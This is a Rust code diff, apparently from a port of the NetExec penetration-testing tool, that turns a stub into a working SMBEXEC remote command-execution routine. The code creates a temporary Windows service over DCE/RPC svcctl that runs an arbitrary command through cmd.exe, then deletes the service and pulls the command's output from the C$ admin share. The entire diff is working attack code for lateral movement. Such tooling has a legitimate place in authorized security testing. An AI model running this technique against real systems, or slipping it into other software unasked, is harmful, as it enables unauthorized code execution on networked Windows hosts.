@@ -1173,9 +1173,57 @@ impl SmbProtocol {
         Ok(String::from_utf8_lossy(&output).to_string())
     }
 
-    async fn call_smbexec(&self, _session: &SmbSession, _command: &str) -> Result<String> {
-        // Implementation of service-based execution...
-        Ok("Executed via smbexec".into())
+    async fn call_smbexec(&self, session: &SmbSession, command: &str) -> Result<String> {
+        debug!("SMB: Executing via SMBEXEC: {}", command);
+        use crate::rpc::{svcctl, DcerpcBind, DcerpcRequest, PacketType, UUID_SVCCTL};
+
+        let bind = DcerpcBind::new(UUID_SVCCTL, 2, 0);
+        let _resp = self.call_rpc(session, "svcctl", PacketType::Bind, 1, bind.to_bytes()).await?;
+
+        let service_name = format!("nxc_{}", rand::random::<u32>());
+        let tmp_file = format!("C:\\windows\\temp\\{service_name}.tmp");
+        let full_cmd = format!("%COMSPEC% /c echo {command} ^> {tmp_file} 2^>^&1 > %TEMP%\\execute.bat & %COMSPEC% /c %TEMP%\\execute.bat");
+
+        // 1. Open SC Manager
+        let sc_req = svcctl::build_open_sc_manager(&session.target);
+        let rpc_req = DcerpcRequest::new(svcctl::OPEN_SC_MANAGER, sc_req);
+        let resp = self.call_rpc(session, "svcctl", PacketType::Request, 2, rpc_req.to_bytes()).await?;
+        let mut sc_handle = [0u8; 20];
+        if resp.len() >= 44 {
+            sc_handle.copy_from_slice(&resp[24..44]);
+        } else {
+            return Err(anyhow::anyhow!("Invalid response length for OpenSCManager: {}", resp.len()));
+        }
+
+        // 2. Create Service
+        let create_req = svcctl::build_create_service(&sc_handle, &service_name, &service_name, &full_cmd);
+        let rpc_req2 = DcerpcRequest::new(svcctl::CREATE_SERVICE, create_req);
+        let resp2 = self.call_rpc(session, "svcctl", PacketType::Request, 3, rpc_req2.to_bytes()).await?;
+        let mut svc_handle = [0u8; 20];
+        if resp2.len() >= 44 {
+            svc_handle.copy_from_slice(&resp2[24..44]);
+        } else {
+            return Err(anyhow::anyhow!("Invalid response length for CreateService: {}", resp2.len()));
+        }
+
+        // 3. Start Service
+        let start_req = svcctl::build_start_service(&svc_handle);
+        let rpc_req3 = DcerpcRequest::new(svcctl::START_SERVICE, start_req);
+        let _ = self.call_rpc(session, "svcctl", PacketType::Request, 4, rpc_req3.to_bytes()).await;
+
+        // 4. Delete Service
+        let del_req = svcctl::build_delete_service(&svc_handle);
+        let rpc_req4 = DcerpcRequest::new(svcctl::DELETE_SERVICE, del_req);
+        let _ = self.call_rpc(session, "svcctl", PacketType::Request, 5, rpc_req4.to_bytes()).await;
+
+        // Wait for execution and read file
+        tokio::time::sleep(Duration::from_secs(2)).await;
+        let output = self.download_file(session, "C$", &tmp_file.replace("C:\\", "")).await.unwrap_or_default();
+
+        // Cleanup
+        let _ = self.delete_file(session, "C$", &tmp_file.replace("C:\\", "")).await;
+
+        Ok(String::from_utf8_lossy(&output).to_string())
     }
 }
 
